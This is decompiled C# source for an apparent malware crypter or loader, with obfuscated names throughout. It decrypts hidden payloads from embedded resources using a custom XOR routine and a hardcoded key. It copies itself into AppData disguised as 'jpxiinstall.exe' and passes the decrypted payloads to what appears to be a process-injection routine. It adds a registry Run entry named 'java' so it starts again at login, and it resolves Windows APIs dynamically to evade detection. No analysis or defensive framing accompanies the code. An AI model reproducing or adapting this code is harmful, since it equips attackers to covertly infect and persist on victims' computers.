using System;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using Microsoft.Win32;

namespace vezdvpgGmFOhEhA;

public class hNfDMThcbwCaumBlbctZiUJKKDGeZv
{
	public delegate IntPtr iKaVrEZVytvXOQA(IntPtr oYDzuQJdsxldrEK, IntPtr qmyFmaTEnWKTJxM, uint oyVtkFJdXTchBPm, uint IKWMVIIxLgusqDJ, uint XaEFjLiZufGjAMj);

	public delegate uint uAKzWEXVhlIRENP(IntPtr oYDzuQJdsxldrEK, IntPtr TrOanaWWBeEbjlO);

	public delegate int JZtWrdQnihmRMaT(IntPtr oYDzuQJdsxldrEK, IntPtr TrOanaWWBeEbjlO, IntPtr nsynVcBVFAAKBHp, uint yhKCndDqqJbecBD, IntPtr JYNFSnJoRgrvjzL);

	public delegate int NVQcpCORqYlOSJI(IntPtr ptpnExqGYLIdjDT, IntPtr YztbQBXWPbOTTvW);

	public delegate int MuhJHvCSyxDnCtJ(IntPtr ptpnExqGYLIdjDT, IntPtr YztbQBXWPbOTTvW);

	public delegate uint MkVnwMbBxmUieXg(IntPtr ptpnExqGYLIdjDT, IntPtr HuQEtGOPXgtrPTj);

	private static string[] wgrQDSztZfglDaNjEyTZTPIbvnduSj = new string[1] { "rAdKaaDshmrxUiKyaBLX" };

	private static string ndcEavIEIILJcoSXqJXAYhkaBGxptq = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

	public static string[] PeyQSdiYZrzaQlokNtjxXsxrlfScdt;

	private static byte[] smethod_0(byte[] YsktSGllvPPrJFbYrZMtSdgWsvGhFN, byte[] lgVFsgQxtGYCYtIFISqnOSqLBVnoZw)
	{
		byte[] array = (byte[])YsktSGllvPPrJFbYrZMtSdgWsvGhFN.Clone();
		for (int i = 0; i < 5; i++)
		{
			for (int j = 0; j < array.Length; j++)
			{
				array[j] = (byte)(array[j] ^ lgVFsgQxtGYCYtIFISqnOSqLBVnoZw[j % lgVFsgQxtGYCYtIFISqnOSqLBVnoZw.Length]);
				for (int k = 0; k < lgVFsgQxtGYCYtIFISqnOSqLBVnoZw.Length; k++)
				{
					array[j] = (byte)(array[j] ^ (((lgVFsgQxtGYCYtIFISqnOSqLBVnoZw[k] << i) ^ k) + j));
				}
			}
		}
		return array;
	}

	public static string smethod_1(string aeFIDIuemUhSHfsqeMnMMOQsZtPkex, string TCyUGUWqPZkEGvfVkktmQzamJmnnJm)
	{
		byte[] bytes = smethod_0(smethod_2(aeFIDIuemUhSHfsqeMnMMOQsZtPkex), smethod_2(TCyUGUWqPZkEGvfVkktmQzamJmnnJm));
		return Encoding.Default.GetString(bytes);
	}

	private static byte[] smethod_2(string TlaNbEtNyysOXnBiiuodiFSSHtBmku)
	{
		return Encoding.Default.GetBytes(TlaNbEtNyysOXnBiiuodiFSSHtBmku);
	}

	private static void Main(string[] args)
	{
		smethod_3();
	}

	public static void smethod_3()
	{
		ResourceManager resourceManager = new ResourceManager("qREiXxqdvtbcnlV", Assembly.GetExecutingAssembly());
		string @string = resourceManager.GetString("GEttALsd");
		string string2 = resourceManager.GetString("lUAYjdA");
		string string3 = resourceManager.GetString("OICbT");
		string string4 = resourceManager.GetString("GwnaGU");
		resourceManager.GetString("gxqmGnsLM");
		resourceManager.GetString("tOXiQX");
		string string5 = resourceManager.GetString("OsnvzhaU");
		string tCyUGUWqPZkEGvfVkktmQzamJmnnJm = ")&%&*&%'*$)%)'*$#&%&'!)*$";
		@string = smethod_1(@string, tCyUGUWqPZkEGvfVkktmQzamJmnnJm);
		string2 = smethod_1(string2, tCyUGUWqPZkEGvfVkktmQzamJmnnJm);
		string3 = smethod_1(string3, tCyUGUWqPZkEGvfVkktmQzamJmnnJm);
		string4 = smethod_1(string4, tCyUGUWqPZkEGvfVkktmQzamJmnnJm);
		string5 = smethod_1(string5, tCyUGUWqPZkEGvfVkktmQzamJmnnJm);
		PeyQSdiYZrzaQlokNtjxXsxrlfScdt = string5.Split(new char[1] { '|' });
		string executablePath = Application.get_ExecutablePath();
		if (!executablePath.Contains(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)))
		{
			byte[] bytes = File.ReadAllBytes(executablePath);
			string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "jpxiinstall.exe");
			if (!File.Exists(path))
			{
				File.WriteAllBytes(path, bytes);
			}
		}
		if (@string != string.Empty)
		{
			executablePath = PeyQSdiYZrzaQlokNtjxXsxrlfScdt[0];
			string[] array = @string.Split(wgrQDSztZfglDaNjEyTZTPIbvnduSj, StringSplitOptions.RemoveEmptyEntries);
			foreach (string tlaNbEtNyysOXnBiiuodiFSSHtBmku in array)
			{
				try
				{
					WqpgsPsWEZyRiWqtCaCsOTxUfCRIVL.smethod_0(smethod_2(tlaNbEtNyysOXnBiiuodiFSSHtBmku), executablePath);
				}
				catch
				{
				}
			}
		}
		smethod_5();
	}

	private static int smethod_4(int chCeRIithCDpaNBKUYZFSOBIrPKayS, int GuMMxtUGcjThFhXORlesstjzOnFTNc)
	{
		Random random = new Random();
		return random.Next(chCeRIithCDpaNBKUYZFSOBIrPKayS, GuMMxtUGcjThFhXORlesstjzOnFTNc);
	}

	private static void smethod_5()
	{
		string name = "java";
		string name2 = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
		try
		{
			string value = ndcEavIEIILJcoSXqJXAYhkaBGxptq + "\\jpxiinstall.exe";
			Registry.CurrentUser.OpenSubKey(name2, writable: true)!.SetValue(name, value);
		}
		catch
		{
		}
	}

	public static T smethod_6<T>(string YhVoWjCnqhQnWPLKjtKBXyWfzmmmYk, string OaTZlMltlOmDVWCgwsOdelilezkPOJ)
	{
		IntPtr rfcmfHwzoBErmlgmHdEtQFnZOPrEhX = WqpgsPsWEZyRiWqtCaCsOTxUfCRIVL.LoadLibraryA(YhVoWjCnqhQnWPLKjtKBXyWfzmmmYk);
		IntPtr procAddress = WqpgsPsWEZyRiWqtCaCsOTxUfCRIVL.GetProcAddress(rfcmfHwzoBErmlgmHdEtQFnZOPrEhX, OaTZlMltlOmDVWCgwsOdelilezkPOJ);
		return (T)(object)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(T));
	}
}
